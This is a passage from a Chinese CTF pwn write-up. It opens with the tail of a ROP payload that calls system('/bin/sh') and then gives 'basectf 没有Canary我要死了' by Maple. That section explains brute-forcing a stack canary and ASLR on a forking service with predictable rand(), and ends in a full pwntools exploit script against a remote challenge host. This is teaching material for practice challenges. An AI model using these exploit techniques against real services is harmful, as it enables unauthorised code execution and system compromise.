pop_rdi
)
+
p64
(
binsh
)
+
p64
(
system_addr
)

payload
+=
p64
(
0
)


# 填充一个

payload
+=
p64
(
buf_addr
)
+
p64
(
leave
)

p
.
send
(
payload
)

p
.
interactive
()

```


# basectf 没有Canary我要死了

by Maple

有fork，还有Canary保护，那应该是爆破Canary，可以看[这里](../../Stack/Canary/index.md)

在这之前还有伪随机数的利用

然后还有一个shell函数，里面是`return system("/bin/cat flag");`这里也是直接爆破绕过ASLR

可以调试得到shell的偏移是0x02B1，由于程序不会崩溃，所以可以多次尝试，因为ASLR以页为单位随机化，所以直接每次`+0x1000`就好


```

from

pwn

import

*

from

LibcSearcher

import

LibcSearcher

from

ctypes

import

*

#context(os='linux', arch='amd64',log_level='debug')

context
.
terminal

=

'wt.exe -d . wsl.exe -d Ubuntu'
.
split
()

elf

=

ELF
(
"./pwn"
)

#p = process('./pwn')

p

=

remote
(
'gz.imxbt.cn'
,
20467
)

libc

=

cdll
.
LoadLibrary
(
'/lib/x86_64-linux-gnu/libc.so.6'
)

seed

=

libc
.
time
(
0
)

libc
.
srand
(
seed
)

#-------爆破Canary-------

canary

=

b
'
\x00
'

for

i

in

range
(
7
):


for

j

in

range
(
256
):


num

=

libc
.
rand
()
%
50


p
.
sendline
(
str
(
num
))


payload

=

b
'a'
*
0x68
+
canary
+
p8
(
j
)


p
.
send
(
payload
)


p
.
recvuntil
(
'welcome
\n
'
)


rec

=

p
.
readline
()


if

b
'smashing'

not

in

rec
:


print
(
f
'find
{
i
+
1
}
'
)


canary

+=
p8
(
j
)


break

#log.info('Canary；'+hex(u64(canary)))

shell

=

0x02B1

while
(
1
):


for

i

in

range
(
16
):


num

=

libc
.
rand
()
%
50


p
.
sendline
(
str
(
num
))


payload

=

b
'a'
*
0x68
+
canary
+
b
'a'
*
0x8
+
p16
(
shell
)


p
.
send
(
payload
)


rec

=

p
.
readline
()


log
.
info
(
rec
)


if

b
'welcome'

in

rec
:


p
.
readline
()


shell
+=
0x1000


continue


else
:


break

p
.
interactive
()

```
